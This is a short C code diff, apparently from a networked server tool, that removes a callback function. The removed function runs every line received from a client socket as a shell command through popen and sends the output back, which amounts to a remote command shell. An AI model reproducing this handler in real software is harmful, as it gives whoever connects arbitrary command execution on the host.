@@ -64,24 +64,6 @@ struct config * create_shared_memory() {
     return mmap(NULL, sizeof(struct config), protection, visibility, -1, 0);
 }
 
-int server_blues_callback(void *args) {
-    int read_size;
-    char message[MESSAGE_SIZE];
-
-    dup2(client_connection, 0);
-
-    while (recv(client_connection, message, 0, MSG_PEEK | MSG_DONTWAIT) != 0) {
-        FILE *buffer_file;
-        read_size = strlen(fgets(message, MESSAGE_SIZE, stdin));
-        message[read_size] = '\0';
-        buffer_file = popen(message, "r");
-        read_size = fread(message, sizeof(char), MESSAGE_SIZE, buffer_file);
-        send(client_connection, message, read_size, 0);
-    }
-
-    return 0;
-}
-
 int start_blue_servers(struct config *config) {
     printf("%s[%s]%s Starting %d server blues\n", 
     ANSI_COLOR_CYAN, get_current_time_as_string(), ANSI_COLOR_RESET,
